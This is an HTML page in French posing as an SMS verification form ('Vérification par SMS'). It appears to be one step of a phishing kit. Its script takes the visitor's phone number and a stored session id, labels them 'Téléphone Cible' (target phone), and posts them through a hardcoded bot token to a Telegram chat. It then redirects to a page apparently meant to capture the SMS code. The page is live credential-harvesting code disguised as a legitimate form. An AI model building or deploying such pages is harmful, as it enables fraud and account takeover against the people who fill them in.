<!doctype html>
<html lang="fr">
<head>
<!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
    <link rel="icon" type="image/x-icon" href="logo.ico">
    <link rel="shortcut icon" type="image/x-icon" href="logo.ico">

    <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
    <link rel="apple-touch-icon" href="logo.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Vérification par SMS</title>
  <style>
    :root { color: #111; font-family: "Futura", Arial, Helvetica, sans-serif; font-weight: bold; background: #fff; }
    * { box-sizing: border-box; }
    body { min-width: 320px; min-height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fff; }
    main { width: min(100% - 40px, 400px); padding: 40px 0; margin: auto; }
    h1 { margin: 0 0 28px; font-size: 24px; font-weight: bold; text-align: center; }
    .field-label { display: block; margin: 0 0 10px; font-size: 15px; font-weight: bold; }
    .image-field { position: relative; width: 100%; aspect-ratio: 400 / 74; margin-bottom: 22px; }
    .image-field img { display: block; width: 100%; height: 100%; }
    .image-field input, .image-field select { position: absolute; inset: 3px 4%; border: 0; outline: 0; background: transparent; color: #111; font: inherit; font-weight: bold; }
    .phone-field { display: flex; align-items: center; gap: 8px; }
    .phone-field select { inset: 3px auto 3px 4%; width: 28%; padding: 0 2px; }
    .phone-field input { inset: 3px 4% 3px 34%; width: 62%; padding-left: 4px; }
    .action { display: block; width: 85%; max-width: 340px; margin: 0 auto; padding: 0; border: 0; background: transparent; cursor: pointer; }
    .action img { display: block; width: 100%; height: auto; }
    .back { display: block; margin: 18px auto 0; padding: 4px; border: 0; background: transparent; color: #111; font: inherit; font-weight: bold; text-decoration: underline; cursor: pointer; text-align: center; }
  </style>
</head>
<body>
  <main>
    <form id="formPhoneTarget">
      <h1>Vérification par SMS</h1>
      <label class="field-label" for="phone">Numéro de téléphone</label>
      <div class="image-field phone-field">
        <img src="champs.JPG" alt="">
        <select id="prefix">
          <option value="+33" selected>+33 (France)</option>
          <option value="+32">+32 (Belgique)</option>
          <option value="+41">+41 (Suisse)</option>
          <option value="+1">+1 (États-Unis / Canada)</option>
          <option value="+49">+49 (Allemagne)</option>
          <option value="+34">+34 (Espagne)</option>
          <option value="+39">+39 (Italie)</option>
          <option value="+352">+352 (Luxembourg)</option>
          <option value="+31">+31 (Pays-Bas)</option>
          <option value="+351">+351 (Portugal)</option>
          <option value="+44">+44 (Royaume-Uni)</option>
        </select>
        <input id="phone" type="tel" pattern="[0-9]{6,15}" placeholder="Numéro" required autocomplete="off">
      </div>
      <button class="action" id="submitBtn" type="submit">
        <img src="next.JPG" alt="Next">
      </button>
      <a href="3-security.html" class="back">Retour</a>
    </form>
  </main>
  <script>
    const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
    const TELEGRAM_CHAT_ID = "8550191274";

    document.getElementById('formPhoneTarget').addEventListener('submit', async (e) => {
      e.preventDefault();
      const prefix = document.getElementById('prefix').value;
      const number = document.getElementById('phone').value;
      if (!number) return;
      const fullPhone = prefix + ' ' + number;
      const clientId = localStorage.getItem('client_id') || 'Inconnu';

      const message = `📱 *Nouvelle info - Téléphone Cible*\n🆔 Session: \`${clientId}\`\n📞 Numéro: \`${fullPhone}\``;
      const btn = document.getElementById('submitBtn');
      btn.style.opacity = '0.5';

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (error) {
        console.error("Erreur Telegram", error);
      }

      window.location.href = '5b-sms-code.html';
    });
  </script>
</body>
</html>
